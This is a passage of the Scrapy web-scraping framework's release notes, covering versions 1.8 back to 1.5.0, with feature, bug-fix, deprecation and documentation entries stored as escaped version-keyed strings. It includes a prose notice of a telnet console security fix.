<support-for-new-robots-parser>` (:issue:`754`, :issue:`2669`,\n    :issue:`3796`, :issue:`3935`, :issue:`3969`, :issue:`4006`)\n\n*   A new :setting:`ROBOTSTXT_USER_AGENT` setting allows defining a separate\n    user agent string to use for robots.txt_ parsing (:issue:`3931`,\n    :issue:`3966`)\n\n*   :class:`~scrapy.spiders.Rule` no longer requires a :class:`LinkExtractor\n    <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>` parameter\n    (:issue:`781`, :issue:`4016`)\n\n*   Use the new :setting:`DOWNLOADER_CLIENT_TLS_CIPHERS` setting to customize\n    the TLS/SSL ciphers used by the default HTTP/1.1 downloader (:issue:`3392`,\n    :issue:`3442`)\n\n*   Set the new :setting:`DOWNLOADER_CLIENT_TLS_VERBOSE_LOGGING` setting to\n    ``True`` to enable debug-level messages about TLS connection parameters\n    after establishing HTTPS connections (:issue:`2111`, :issue:`3450`)\n\n*   Callbacks that receive keyword arguments\n    (see :attr:`Request.cb_kwargs <scrapy.http.Request.cb_kwargs>`) can now be\n    tested using the new :class:`cb_kwargs\n    <scrapy.contracts.default.CallbackKeywordArgumentsContract>`\n    :ref:`spider contract <topics-contracts>` (:issue:`3985`, :issue:`3988`)\n\n*   When a :class:`scrapes <scrapy.contracts.default.ScrapesContract>` spider\n    contract fails, all missing fields are now reported (:issue:`766`,\n    :issue:`3939`)\n\n*   :ref:`Custom log formats <custom-log-formats>` can now drop messages by\n    having the corresponding methods of the configured :setting:`LOG_FORMATTER`\n    return ``None`` (:issue:`3984`, :issue:`3987`)\n\n*   A much improved completion definition is now available for Zsh_\n    (:issue:`4069`)\n\n\nBug fixes\n~~~~~~~~~\n\n*   :meth:`ItemLoader.load_item() <scrapy.loader.ItemLoader.load_item>` no\n    longer makes later calls to :meth:`ItemLoader.get_output_value()\n    <scrapy.loader.ItemLoader.get_output_value>` or\n    :meth:`ItemLoader.load_item() <scrapy.loader.ItemLoader.load_item>` return\n    empty data (:issue:`3804`, :issue:`3819`, :issue:`3897`, :issue:`3976`,\n    :issue:`3998`, :issue:`4036`)\n\n*   Fixed :class:`~scrapy.statscollectors.DummyStatsCollector` raising a\n    :exc:`TypeError` exception (:issue:`4007`, :issue:`4052`)\n\n*   :meth:`FilesPipeline.file_path\n    <scrapy.pipelines.files.FilesPipeline.file_path>` and\n    :meth:`ImagesPipeline.file_path\n    <scrapy.pipelines.images.ImagesPipeline.file_path>` no longer choose\n    file extensions that are not `registered with IANA`_ (:issue:`1287`,\n    :issue:`3953`, :issue:`3954`)\n\n*   When using botocore_ to persist files in S3, all botocore-supported headers\n    are properly mapped now (:issue:`3904`, :issue:`3905`)\n\n*   FTP passwords in :setting:`FEED_URI` containing percent-escaped characters\n    are now properly decoded (:issue:`3941`)\n\n*   A memory-handling and error-handling issue in\n    :func:`scrapy.utils.ssl.get_temp_key_info` has been fixed (:issue:`3920`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   The documentation now covers how to define and configure a :ref:`custom log\n    format <custom-log-formats>` (:issue:`3616`, :issue:`3660`)\n\n*   API documentation added for :class:`~scrapy.exporters.MarshalItemExporter`\n    and :class:`~scrapy.exporters.PythonItemExporter` (:issue:`3973`)\n\n*   API documentation added for :class:`~scrapy.item.BaseItem` and\n    :class:`~scrapy.item.ItemMeta` (:issue:`3999`)\n\n*   Minor documentation fixes (:issue:`2998`, :issue:`3398`, :issue:`3597`,\n    :issue:`3894`, :issue:`3934`, :issue:`3978`, :issue:`3993`, :issue:`4022`,\n    :issue:`4028`, :issue:`4033`, :issue:`4046`, :issue:`4050`, :issue:`4055`,\n    :issue:`4056`, :issue:`4061`, :issue:`4072`, :issue:`4071`, :issue:`4079`,\n    :issue:`4081`, :issue:`4089`, :issue:`4093`)\n\n\n.. _1.8-deprecation-removals:\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\n*   ``scrapy.xlib`` has been removed (:issue:`4015`)\n\n\n.. _1.8-deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n*   The LevelDB_ storage backend\n    (``scrapy.extensions.httpcache.LeveldbCacheStorage``) of\n    :class:`~scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware` is\n    deprecated (:issue:`4085`, :issue:`4092`)\n\n*   Use of the undocumented ``SCRAPY_PICKLED_SETTINGS_TO_OVERRIDE`` environment\n    variable is deprecated (:issue:`3910`)\n\n*   ``scrapy.item.DictItem`` is deprecated, use :class:`~scrapy.item.Item`\n    instead (:issue:`3999`)\n\n\nOther changes\n~~~~~~~~~~~~~\n\n*   Minimum versions of optional Scrapy requirements that are covered by\n    continuous integration tests have been updated:\n\n    *   botocore_ 1.3.23\n    *   Pillow_ 3.4.2\n\n    Lower versions of these optional requirements may work, but it is not\n    guaranteed (:issue:`3892`)\n\n*   GitHub templates for bug reports and feature requests (:issue:`3126`,\n    :issue:`3471`, :issue:`3749`, :issue:`3754`)\n\n*   Continuous integration fixes (:issue:`3923`)\n\n*   Code cleanup (:issue:`3391`, :issue:`3907`, :issue:`3946`, :issue:`3950`,\n    :issue:`4023`, :issue:`4031`)\n\n\n.. _release-1.7.4:\n\n", "1.7.4": "-------------------------\n\nRevert the fix for :issue:`3804` (:issue:`3819`), which has a few undesired\nside effects (:issue:`3897`, :issue:`3976`).\n\nAs a result, when an item loader is initialized with an item,\n:meth:`ItemLoader.load_item() <scrapy.loader.ItemLoader.load_item>` once again\nmakes later calls to :meth:`ItemLoader.get_output_value()\n<scrapy.loader.ItemLoader.get_output_value>` or :meth:`ItemLoader.load_item()\n<scrapy.loader.ItemLoader.load_item>` return empty data.\n\n\n.. _release-1.7.3:\n\n", "1.7.3": "-------------------------\n\nEnforce lxml 4.3.5 or lower for Python 3.4 (:issue:`3912`, :issue:`3918`).\n\n\n.. _release-1.7.2:\n\n", "1.7.2": "-------------------------\n\nFix Python 2 support (:issue:`3889`, :issue:`3893`, :issue:`3896`).\n\n\n.. _release-1.7.1:\n\n", "1.7.1": "-------------------------\n\nRe-packaging of Scrapy 1.7.0, which was missing some changes in PyPI.\n\n\n.. _release-1.7.0:\n\n", "1.7.0": "-------------------------\n\n.. note:: Make sure you install Scrapy 1.7.1. The Scrapy 1.7.0 package in PyPI\n          is the result of an erroneous commit tagging and does not include all\n          the changes described below.\n\nHighlights:\n\n* Improvements for crawls targeting multiple domains\n* A cleaner way to pass arguments to callbacks\n* A new class for JSON requests\n* Improvements for rule-based spiders\n* New features for feed exports\n\nBackward-incompatible changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n*   ``429`` is now part of the :setting:`RETRY_HTTP_CODES` setting by default\n\n    This change is **backward incompatible**. If you don\u2019t want to retry\n    ``429``, you must override :setting:`RETRY_HTTP_CODES` accordingly.\n\n*   :class:`~scrapy.crawler.Crawler`,\n    :class:`CrawlerRunner.crawl <scrapy.crawler.CrawlerRunner.crawl>` and\n    :class:`CrawlerRunner.create_crawler <scrapy.crawler.CrawlerRunner.create_crawler>`\n    no longer accept a :class:`~scrapy.spiders.Spider` subclass instance, they\n    only accept a :class:`~scrapy.spiders.Spider` subclass now.\n\n    :class:`~scrapy.spiders.Spider` subclass instances were never meant to\n    work, and they were not working as one would expect: instead of using the\n    passed :class:`~scrapy.spiders.Spider` subclass instance, their\n    :class:`~scrapy.spiders.Spider.from_crawler` method was called to generate\n    a new instance.\n\n*   Non-default values for the :setting:`SCHEDULER_PRIORITY_QUEUE` setting\n    may stop working. Scheduler priority queue classes now need to handle\n    :class:`~scrapy.http.Request` objects instead of arbitrary Python data\n    structures.\n\n*   An additional ``crawler`` parameter has been added to the ``__init__``\n    method of the :class:`~scrapy.core.scheduler.Scheduler` class. Custom\n    scheduler subclasses which don't accept arbitrary parameters in their\n    ``__init__`` method might break because of this change.\n\n    For more information, see :setting:`SCHEDULER`.\n\nSee also :ref:`1.7-deprecation-removals` below.\n\n\nNew features\n~~~~~~~~~~~~\n\n*   A new scheduler priority queue,\n    ``scrapy.pqueues.DownloaderAwarePriorityQueue``, may be\n    :ref:`enabled <broad-crawls-scheduler-priority-queue>` for a significant\n    scheduling improvement on crawls targeting multiple web domains, at the\n    cost of no :setting:`CONCURRENT_REQUESTS_PER_IP` support (:issue:`3520`)\n\n*   A new :attr:`Request.cb_kwargs <scrapy.http.Request.cb_kwargs>` attribute\n    provides a cleaner way to pass keyword arguments to callback methods\n    (:issue:`1138`, :issue:`3563`)\n\n*   A new :class:`JSONRequest <scrapy.http.JsonRequest>` class offers a more\n    convenient way to build JSON requests (:issue:`3504`, :issue:`3505`)\n\n*   A ``process_request`` callback passed to the :class:`~scrapy.spiders.Rule`\n    ``__init__`` method now receives the :class:`~scrapy.http.Response` object that\n    originated the request as its second argument (:issue:`3682`)\n\n*   A new ``restrict_text`` parameter for the\n    :attr:`LinkExtractor <scrapy.linkextractors.lxmlhtml.LxmlLinkExtractor>`\n    ``__init__`` method allows filtering links by linking text (:issue:`3622`,\n    :issue:`3635`)\n\n*   A new :setting:`FEED_STORAGE_S3_ACL` setting allows defining a custom ACL\n    for feeds exported to Amazon S3 (:issue:`3607`)\n\n*   A new :setting:`FEED_STORAGE_FTP_ACTIVE` setting allows using FTP\u2019s active\n    connection mode for feeds exported to FTP servers (:issue:`3829`)\n\n*   A new :setting:`METAREFRESH_IGNORE_TAGS` setting allows overriding which\n    HTML tags are ignored when searching a response for HTML meta tags that\n    trigger a redirect (:issue:`1422`, :issue:`3768`)\n\n*   A new :reqmeta:`redirect_reasons` request meta key exposes the reason\n    (status code, meta refresh) behind every followed redirect (:issue:`3581`,\n    :issue:`3687`)\n\n*   The ``SCRAPY_CHECK`` variable is now set to the ``true`` string during runs\n    of the :command:`check` command, which allows :ref:`detecting contract\n    check runs from code <detecting-contract-check-runs>` (:issue:`3704`,\n    :issue:`3739`)\n\n*   A new :meth:`Item.deepcopy() <scrapy.item.Item.deepcopy>` method makes it\n    easier to :ref:`deep-copy items <copying-items>` (:issue:`1493`,\n    :issue:`3671`)\n\n*   :class:`~scrapy.extensions.corestats.CoreStats` also logs\n    ``elapsed_time_seconds`` now (:issue:`3638`)\n\n*   Exceptions from :class:`~scrapy.loader.ItemLoader` :ref:`input and output\n    processors <topics-loaders-processors>` are now more verbose\n    (:issue:`3836`, :issue:`3840`)\n\n*   :class:`~scrapy.crawler.Crawler`,\n    :class:`CrawlerRunner.crawl <scrapy.crawler.CrawlerRunner.crawl>` and\n    :class:`CrawlerRunner.create_crawler <scrapy.crawler.CrawlerRunner.create_crawler>`\n    now fail gracefully if they receive a :class:`~scrapy.spiders.Spider`\n    subclass instance instead of the subclass itself (:issue:`2283`,\n    :issue:`3610`, :issue:`3872`)\n\n\nBug fixes\n~~~~~~~~~\n\n*   :meth:`~scrapy.spidermiddlewares.SpiderMiddleware.process_spider_exception`\n    is now also invoked for generators (:issue:`220`, :issue:`2061`)\n\n*   System exceptions like KeyboardInterrupt_ are no longer caught\n    (:issue:`3726`)\n\n*   :meth:`ItemLoader.load_item() <scrapy.loader.ItemLoader.load_item>` no\n    longer makes later calls to :meth:`ItemLoader.get_output_value()\n    <scrapy.loader.ItemLoader.get_output_value>` or\n    :meth:`ItemLoader.load_item() <scrapy.loader.ItemLoader.load_item>` return\n    empty data (:issue:`3804`, :issue:`3819`)\n\n*   The images pipeline (:class:`~scrapy.pipelines.images.ImagesPipeline`) no\n    longer ignores these Amazon S3 settings: :setting:`AWS_ENDPOINT_URL`,\n    :setting:`AWS_REGION_NAME`, :setting:`AWS_USE_SSL`, :setting:`AWS_VERIFY`\n    (:issue:`3625`)\n\n*   Fixed a memory leak in ``scrapy.pipelines.media.MediaPipeline`` affecting,\n    for example, non-200 responses and exceptions from custom middlewares\n    (:issue:`3813`)\n\n*   Requests with private callbacks are now correctly unserialized from disk\n    (:issue:`3790`)\n\n*   :meth:`FormRequest.from_response() <scrapy.http.FormRequest.from_response>`\n    now handles invalid methods like major web browsers (:issue:`3777`,\n    :issue:`3794`)\n\n\nDocumentation\n~~~~~~~~~~~~~\n\n*   A new topic, :ref:`topics-dynamic-content`, covers recommended approaches\n    to read dynamically-loaded data (:issue:`3703`)\n\n*   :ref:`topics-broad-crawls` now features information about memory usage\n    (:issue:`1264`, :issue:`3866`)\n\n*   The documentation of :class:`~scrapy.spiders.Rule` now covers how to access\n    the text of a link when using :class:`~scrapy.spiders.CrawlSpider`\n    (:issue:`3711`, :issue:`3712`)\n\n*   A new section, :ref:`httpcache-storage-custom`, covers writing a custom\n    cache storage backend for\n    :class:`~scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware`\n    (:issue:`3683`, :issue:`3692`)\n\n*   A new :ref:`FAQ <faq>` entry, :ref:`faq-split-item`, explains what to do\n    when you want to split an item into multiple items from an item pipeline\n    (:issue:`2240`, :issue:`3672`)\n\n*   Updated the :ref:`FAQ entry about crawl order <faq-bfo-dfo>` to explain why\n    the first few requests rarely follow the desired order (:issue:`1739`,\n    :issue:`3621`)\n\n*   The :setting:`LOGSTATS_INTERVAL` setting (:issue:`3730`), the\n    :meth:`FilesPipeline.file_path <scrapy.pipelines.files.FilesPipeline.file_path>`\n    and\n    :meth:`ImagesPipeline.file_path <scrapy.pipelines.images.ImagesPipeline.file_path>`\n    methods (:issue:`2253`, :issue:`3609`) and the\n    :meth:`Crawler.stop() <scrapy.crawler.Crawler.stop>` method (:issue:`3842`)\n    are now documented\n\n*   Some parts of the documentation that were confusing or misleading are now\n    clearer (:issue:`1347`, :issue:`1789`, :issue:`2289`, :issue:`3069`,\n    :issue:`3615`, :issue:`3626`, :issue:`3668`, :issue:`3670`, :issue:`3673`,\n    :issue:`3728`, :issue:`3762`, :issue:`3861`, :issue:`3882`)\n\n*   Minor documentation fixes (:issue:`3648`, :issue:`3649`, :issue:`3662`,\n    :issue:`3674`, :issue:`3676`, :issue:`3694`, :issue:`3724`, :issue:`3764`,\n    :issue:`3767`, :issue:`3791`, :issue:`3797`, :issue:`3806`, :issue:`3812`)\n\n.. _1.7-deprecation-removals:\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\nThe following deprecated APIs have been removed (:issue:`3578`):\n\n*   ``scrapy.conf`` (use :attr:`Crawler.settings\n    <scrapy.crawler.Crawler.settings>`)\n\n*   From ``scrapy.core.downloader.handlers``:\n\n    *   ``http.HttpDownloadHandler`` (use ``http10.HTTP10DownloadHandler``)\n\n*   ``scrapy.loader.ItemLoader._get_values`` (use ``_get_xpathvalues``)\n\n*   ``scrapy.loader.XPathItemLoader`` (use :class:`~scrapy.loader.ItemLoader`)\n\n*   ``scrapy.log`` (see :ref:`topics-logging`)\n\n*   From ``scrapy.pipelines``:\n\n    *   ``files.FilesPipeline.file_key`` (use ``file_path``)\n\n    *   ``images.ImagesPipeline.file_key`` (use ``file_path``)\n\n    *   ``images.ImagesPipeline.image_key`` (use ``file_path``)\n\n    *   ``images.ImagesPipeline.thumb_key`` (use ``thumb_path``)\n\n*   From both ``scrapy.selector`` and ``scrapy.selector.lxmlsel``:\n\n    *   ``HtmlXPathSelector`` (use :class:`~scrapy.selector.Selector`)\n\n    *   ``XmlXPathSelector`` (use :class:`~scrapy.selector.Selector`)\n\n    *   ``XPathSelector`` (use :class:`~scrapy.selector.Selector`)\n\n    *   ``XPathSelectorList`` (use :class:`~scrapy.selector.Selector`)\n\n*   From ``scrapy.selector.csstranslator``:\n\n    *   ``ScrapyGenericTranslator`` (use parsel.csstranslator.GenericTranslator_)\n\n    *   ``ScrapyHTMLTranslator`` (use parsel.csstranslator.HTMLTranslator_)\n\n    *   ``ScrapyXPathExpr`` (use parsel.csstranslator.XPathExpr_)\n\n*   From :class:`~scrapy.selector.Selector`:\n\n    *   ``_root`` (both the ``__init__`` method argument and the object property, use\n        ``root``)\n\n    *   ``extract_unquoted`` (use ``getall``)\n\n    *   ``select`` (use ``xpath``)\n\n*   From :class:`~scrapy.selector.SelectorList`:\n\n    *   ``extract_unquoted`` (use ``getall``)\n\n    *   ``select`` (use ``xpath``)\n\n    *   ``x`` (use ``xpath``)\n\n*   ``scrapy.spiders.BaseSpider`` (use :class:`~scrapy.spiders.Spider`)\n\n*   From :class:`~scrapy.spiders.Spider` (and subclasses):\n\n    *   ``DOWNLOAD_DELAY`` (use :ref:`download_delay\n        <spider-download_delay-attribute>`)\n\n    *   ``set_crawler`` (use :meth:`~scrapy.spiders.Spider.from_crawler`)\n\n*   ``scrapy.spiders.spiders`` (use :class:`~scrapy.spiderloader.SpiderLoader`)\n\n*   ``scrapy.telnet`` (use :mod:`scrapy.extensions.telnet`)\n\n*   From ``scrapy.utils.python``:\n\n    *   ``str_to_unicode`` (use ``to_unicode``)\n\n    *   ``unicode_to_str`` (use ``to_bytes``)\n\n*   ``scrapy.utils.response.body_or_str``\n\nThe following deprecated settings have also been removed (:issue:`3578`):\n\n*   ``SPIDER_MANAGER_CLASS`` (use :setting:`SPIDER_LOADER_CLASS`)\n\n\n.. _1.7-deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n*   The ``queuelib.PriorityQueue`` value for the\n    :setting:`SCHEDULER_PRIORITY_QUEUE` setting is deprecated. Use\n    ``scrapy.pqueues.ScrapyPriorityQueue`` instead.\n\n*   ``process_request`` callbacks passed to :class:`~scrapy.spiders.Rule` that\n    do not accept two arguments are deprecated.\n\n*   The following modules are deprecated:\n\n    *   ``scrapy.utils.http`` (use `w3lib.http`_)\n\n    *   ``scrapy.utils.markup`` (use `w3lib.html`_)\n\n    *   ``scrapy.utils.multipart`` (use `urllib3`_)\n\n*   The ``scrapy.utils.datatypes.MergeDict`` class is deprecated for Python 3\n    code bases. Use :class:`~collections.ChainMap` instead. (:issue:`3878`)\n\n*   The ``scrapy.utils.gz.is_gzipped`` function is deprecated. Use\n    ``scrapy.utils.gz.gzip_magic_number`` instead.\n\n.. _urllib3: https://urllib3.readthedocs.io/en/latest/index.html\n.. _w3lib.html: https://w3lib.readthedocs.io/en/latest/w3lib.html#module-w3lib.html\n.. _w3lib.http: https://w3lib.readthedocs.io/en/latest/w3lib.html#module-w3lib.http\n\n\nOther changes\n~~~~~~~~~~~~~\n\n*   It is now possible to run all tests from the same tox_ environment in\n    parallel; the documentation now covers :ref:`this and other ways to run\n    tests <running-tests>` (:issue:`3707`)\n\n*   It is now possible to generate an API documentation coverage report\n    (:issue:`3806`, :issue:`3810`, :issue:`3860`)\n\n*   The :ref:`documentation policies <documentation-policies>` now require\n    docstrings_ (:issue:`3701`) that follow `PEP 257`_ (:issue:`3748`)\n\n*   Internal fixes and cleanup (:issue:`3629`, :issue:`3643`, :issue:`3684`,\n    :issue:`3698`, :issue:`3734`, :issue:`3735`, :issue:`3736`, :issue:`3737`,\n    :issue:`3809`, :issue:`3821`, :issue:`3825`, :issue:`3827`, :issue:`3833`,\n    :issue:`3857`, :issue:`3877`)\n\n.. _release-1.6.0:\n\n", "1.6.0": "-------------------------\n\nHighlights:\n\n* better Windows support;\n* Python 3.7 compatibility;\n* big documentation improvements, including a switch\n  from ``.extract_first()`` + ``.extract()`` API to ``.get()`` + ``.getall()``\n  API;\n* feed exports, FilePipeline and MediaPipeline improvements;\n* better extensibility: :signal:`item_error` and\n  :signal:`request_reached_downloader` signals; ``from_crawler`` support\n  for feed exporters, feed storages and dupefilters.\n* ``scrapy.contracts`` fixes and new features;\n* telnet console security improvements, first released as a\n  backport in :ref:`release-1.5.2`;\n* clean-up of the deprecated code;\n* various bug fixes, small new features and usability improvements across\n  the codebase.\n\nSelector API changes\n~~~~~~~~~~~~~~~~~~~~\n\nWhile these are not changes in Scrapy itself, but rather in the parsel_\nlibrary which Scrapy uses for xpath/css selectors, these changes are\nworth mentioning here. Scrapy now depends on parsel >= 1.5, and\nScrapy documentation is updated to follow recent ``parsel`` API conventions.\n\nMost visible change is that ``.get()`` and ``.getall()`` selector\nmethods are now preferred over ``.extract_first()`` and ``.extract()``.\nWe feel that these new methods result in a more concise and readable code.\nSee :ref:`old-extraction-api` for more details.\n\n.. note::\n    There are currently **no plans** to deprecate ``.extract()``\n    and ``.extract_first()`` methods.\n\nAnother useful new feature is the introduction of ``Selector.attrib`` and\n``SelectorList.attrib`` properties, which make it easier to get\nattributes of HTML elements. See :ref:`selecting-attributes`.\n\nCSS selectors are cached in parsel >= 1.5, which makes them faster\nwhen the same CSS path is used many times. This is very common in\ncase of Scrapy spiders: callbacks are usually called several times,\non different pages.\n\nIf you're using custom ``Selector`` or ``SelectorList`` subclasses,\na **backward incompatible** change in parsel may affect your code.\nSee `parsel changelog`_ for a detailed description, as well as for the\nfull list of improvements.\n\n.. _parsel changelog: https://parsel.readthedocs.io/en/latest/history.html\n\nTelnet console\n~~~~~~~~~~~~~~\n\n**Backward incompatible**: Scrapy's telnet console now requires username\nand password. See :ref:`topics-telnetconsole` for more details. This change\nfixes a **security issue**; see :ref:`release-1.5.2` release notes for details.\n\nNew extensibility features\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* ``from_crawler`` support is added to feed exporters and feed storages. This,\n  among other things, allows to access Scrapy settings from custom feed\n  storages and exporters (:issue:`1605`, :issue:`3348`).\n* ``from_crawler`` support is added to dupefilters (:issue:`2956`); this allows\n  to access e.g. settings or a spider from a dupefilter.\n* :signal:`item_error` is fired when an error happens in a pipeline\n  (:issue:`3256`);\n* :signal:`request_reached_downloader` is fired when Downloader gets\n  a new Request; this signal can be useful e.g. for custom Schedulers\n  (:issue:`3393`).\n* new SitemapSpider :meth:`~.SitemapSpider.sitemap_filter` method which allows\n  to select sitemap entries based on their attributes in SitemapSpider\n  subclasses (:issue:`3512`).\n* Lazy loading of Downloader Handlers is now optional; this enables better\n  initialization error handling in custom Downloader Handlers (:issue:`3394`).\n\nNew FilePipeline and MediaPipeline features\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* Expose more options for S3FilesStore: :setting:`AWS_ENDPOINT_URL`,\n  :setting:`AWS_USE_SSL`, :setting:`AWS_VERIFY`, :setting:`AWS_REGION_NAME`.\n  For example, this allows to use alternative or self-hosted\n  AWS-compatible providers (:issue:`2609`, :issue:`3548`).\n* ACL support for Google Cloud Storage: :setting:`FILES_STORE_GCS_ACL` and\n  :setting:`IMAGES_STORE_GCS_ACL` (:issue:`3199`).\n\n``scrapy.contracts`` improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* Exceptions in contracts code are handled better (:issue:`3377`);\n* ``dont_filter=True`` is used for contract requests, which allows to test\n  different callbacks with the same URL (:issue:`3381`);\n* ``request_cls`` attribute in Contract subclasses allow to use different\n  Request classes in contracts, for example FormRequest (:issue:`3383`).\n* Fixed errback handling in contracts, e.g. for cases where a contract\n  is executed for URL which returns non-200 response (:issue:`3371`).\n\nUsability improvements\n~~~~~~~~~~~~~~~~~~~~~~\n\n* more stats for RobotsTxtMiddleware (:issue:`3100`)\n* INFO log level is used to show telnet host/port (:issue:`3115`)\n* a message is added to IgnoreRequest in RobotsTxtMiddleware (:issue:`3113`)\n* better validation of ``url`` argument in ``Response.follow`` (:issue:`3131`)\n* non-zero exit code is returned from Scrapy commands when error happens\n  on spider initialization (:issue:`3226`)\n* Link extraction improvements: \"ftp\" is added to scheme list (:issue:`3152`);\n  \"flv\" is added to common video extensions (:issue:`3165`)\n* better error message when an exporter is disabled (:issue:`3358`);\n* ``scrapy shell --help`` mentions syntax required for local files\n  (``./file.html``) - :issue:`3496`.\n* Referer header value is added to RFPDupeFilter log messages (:issue:`3588`)\n\nBug fixes\n~~~~~~~~~\n\n* fixed issue with extra blank lines in .csv exports under Windows\n  (:issue:`3039`);\n* proper handling of pickling errors in Python 3 when serializing objects\n  for disk queues (:issue:`3082`)\n* flags are now preserved when copying Requests (:issue:`3342`);\n* FormRequest.from_response clickdata shouldn't ignore elements with\n  ``input[type=image]`` (:issue:`3153`).\n* FormRequest.from_response should preserve duplicate keys (:issue:`3247`)\n\nDocumentation improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* Docs are re-written to suggest .get/.getall API instead of\n  .extract/.extract_first. Also, :ref:`topics-selectors` docs are updated\n  and re-structured to match latest parsel docs; they now contain more topics,\n  such as :ref:`selecting-attributes` or :ref:`topics-selectors-css-extensions`\n  (:issue:`3390`).\n* :ref:`topics-developer-tools` is a new tutorial which replaces\n  old Firefox and Firebug tutorials (:issue:`3400`).\n* SCRAPY_PROJECT environment variable is documented (:issue:`3518`);\n* troubleshooting section is added to install instructions (:issue:`3517`);\n* improved links to beginner resources in the tutorial\n  (:issue:`3367`, :issue:`3468`);\n* fixed :setting:`RETRY_HTTP_CODES` default values in docs (:issue:`3335`);\n* remove unused ``DEPTH_STATS`` option from docs (:issue:`3245`);\n* other cleanups (:issue:`3347`, :issue:`3350`, :issue:`3445`, :issue:`3544`,\n  :issue:`3605`).\n\nDeprecation removals\n~~~~~~~~~~~~~~~~~~~~\n\nCompatibility shims for pre-1.0 Scrapy module names are removed\n(:issue:`3318`):\n\n* ``scrapy.command``\n* ``scrapy.contrib`` (with all submodules)\n* ``scrapy.contrib_exp`` (with all submodules)\n* ``scrapy.dupefilter``\n* ``scrapy.linkextractor``\n* ``scrapy.project``\n* ``scrapy.spider``\n* ``scrapy.spidermanager``\n* ``scrapy.squeue``\n* ``scrapy.stats``\n* ``scrapy.statscol``\n* ``scrapy.utils.decorator``\n\nSee :ref:`module-relocations` for more information, or use suggestions\nfrom Scrapy 1.5.x deprecation warnings to update your code.\n\nOther deprecation removals:\n\n* Deprecated scrapy.interfaces.ISpiderManager is removed; please use\n  scrapy.interfaces.ISpiderLoader.\n* Deprecated ``CrawlerSettings`` class is removed (:issue:`3327`).\n* Deprecated ``Settings.overrides`` and ``Settings.defaults`` attributes\n  are removed (:issue:`3327`, :issue:`3359`).\n\nOther improvements, cleanups\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* All Scrapy tests now pass on Windows; Scrapy testing suite is executed\n  in a Windows environment on CI (:issue:`3315`).\n* Python 3.7 support (:issue:`3326`, :issue:`3150`, :issue:`3547`).\n* Testing and CI fixes (:issue:`3526`, :issue:`3538`, :issue:`3308`,\n  :issue:`3311`, :issue:`3309`, :issue:`3305`, :issue:`3210`, :issue:`3299`)\n* ``scrapy.http.cookies.CookieJar.clear`` accepts \"domain\", \"path\" and \"name\"\n  optional arguments (:issue:`3231`).\n* additional files are included to sdist (:issue:`3495`);\n* code style fixes (:issue:`3405`, :issue:`3304`);\n* unneeded .strip() call is removed (:issue:`3519`);\n* collections.deque is used to store MiddlewareManager methods instead\n  of a list (:issue:`3476`)\n\n.. _release-1.5.2:\n\n", "1.5.2": "-------------------------\n\n* *Security bugfix*: Telnet console extension can be easily exploited by rogue\n  websites POSTing content to http://localhost:6023, we haven't found a way to\n  exploit it from Scrapy, but it is very easy to trick a browser to do so and\n  elevates the risk for local development environment.\n\n  *The fix is backward incompatible*, it enables telnet user-password\n  authentication by default with a random generated password. If you can't\n  upgrade right away, please consider setting :setting:`TELNETCONSOLE_PORT`\n  out of its default value.\n\n  See :ref:`telnet console <topics-telnetconsole>` documentation for more info\n\n* Backport CI build failure under GCE environment due to boto import error.\n\n.. _release-1.5.1:\n\n", "1.5.1": "-------------------------\n\nThis is a maintenance release with important bug fixes, but no new features:\n\n* ``O(N^2)`` gzip decompression issue which affected Python 3 and PyPy\n  is fixed (:issue:`3281`);\n* skipping of TLS validation errors is improved (:issue:`3166`);\n* Ctrl-C handling is fixed in Python 3.5+ (:issue:`3096`);\n* testing fixes (:issue:`3092`, :issue:`3263`);\n* documentation improvements (:issue:`3058`, :issue:`3059`, :issue:`3089`,\n  :issue:`3123`, :issue:`3127`, :issue:`3189`, :issue:`3224`, :issue:`3280`,\n  :issue:`3279`, :issue:`3201`, :issue:`3260`, :issue:`3284`, :issue:`3298`,\n  :issue:`3294`).\n\n\n.. _release-1.5.0:\n\n", "1.5.0": "-------------------------\n\nThis release brings small new features and improvements across the codebase.\nSome highlights:\n\n* Google Cloud Storage is supported in FilesPipeline and ImagesPipeline.\n* Crawling with proxy servers becomes more efficient, as connections\n  to proxies can be reused now.\n* Warnings, exception and logging messages are improved to make debugging\n  easier.\n* ``scrapy parse`` command now allows to set custom request meta via\n  ``--meta`` argument.\n* Compatibility with Python 3.6, PyPy and PyPy3 is improved;\n  PyPy and PyPy3 are now supported officially, by running tests on CI.\n* Better default handling of HTTP 308, 522 and 524 status codes.\n* Documentation is improved, as usual.\n\nBackward Incompatible Changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n* Scrapy 1.5 drops support for Python 3.3.\n* Default Scrapy User-Agent now uses https link to scrapy.org (:issue:`2983`).\n  **This is technically backward-incompatible**; override\n  :setting:`USER_AGENT` if you relied on old value.\n* Logging of settings overridden by ``custom_settings`` is fixed;\n  **this is technically backward-incompatible** because the logger\n  changes from ``[scrapy.utils.log]`` to ``[scrapy.crawler]``. If you're\n  parsing Scrapy logs, please update your log parsers (:issue:`1343`).\n* LinkExtractor now ignores ``m4v`` extension by default, this is change\n  in behavior.\n* 522 and 524 status codes are added to ``RETRY_HTTP_CODES`` (:issue:`2851`)\n\nNew features\n~~~~~~~~~~~~\n\n- Support ``<link>`` tags in ``Response.follow`` (:issue:`2785`)\n- Support for ``ptpython`` REPL (:issue:`2654`)\n- Google Cloud Storage support for FilesPipeline and ImagesPipeline\n  (:issue:`2923`).\n- New ``--meta`` option of the \"scrapy parse\" command allows to pass additional\n  request.meta (:issue:`2883`)\n- Populate spider variable when using ``shell.inspect_response`` (:issue:`2812`)\n- Handle HTTP 308 Permanent Redirect (:issue:`2844`)\n- Add 522 and 524 to ``RETRY_HTTP_CODES`` (:issue:`2851`)\n- Log versions information at startup (:issue:`2857`)\n- 